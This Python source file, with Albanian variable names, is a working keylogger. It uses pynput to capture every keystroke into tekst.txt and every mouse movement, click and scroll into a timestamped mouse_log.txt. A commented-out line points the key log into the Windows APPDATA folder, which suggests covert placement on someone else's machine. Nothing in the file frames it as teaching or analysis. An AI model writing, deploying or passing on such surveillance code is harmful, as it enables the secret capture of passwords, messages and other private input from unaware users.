import os
import logging
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener


qelesat = []
numerimi = 0
# path=os.environ['appdata'] +'\\tekst.txt'
path = 'tekst.txt'


def on_press(qeles) :
	global qelesat, numerimi


	qelesat.append(qeles)
	numerimi +=1

	if numerimi >= 1:
		numerimi = 0
		write_file(qelesat)
		qelesat = []

def write_file(qelesat):
	with open(path,"a") as file:
		for qeles in qelesat:
			k = str(qeles).replace("'","")
			
			if k.find('backspace') > 0:
				file.write(' Backspace ')
				
			elif k.find('space') > 0:
				file.write(' Space ')
				
			elif k.find('shift') > 0:
				file.write(' Shift ')
				
			elif k.find('enter') > 0:
				file.write('\n')
				
			elif k.find('caps_lock') > 0:
				file.write(' Caps_lock ')
				
			elif k.find('esc') > 0:
				return False
			
			elif k.find('qeles'):
				file.write(k)
				
logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_move(x, y):
    logging.info("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))


def on_scroll(x, y, dx, dy):
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))

mouse_listener = MouseListener (on_move=on_move, on_click=on_click, on_scroll=on_scroll)

keyboard_listener = KeyboardListener(on_press=on_press)
mouse_listener.start()
keyboard_listener.start()
mouse_listener.join()
keyboard_listener.join()
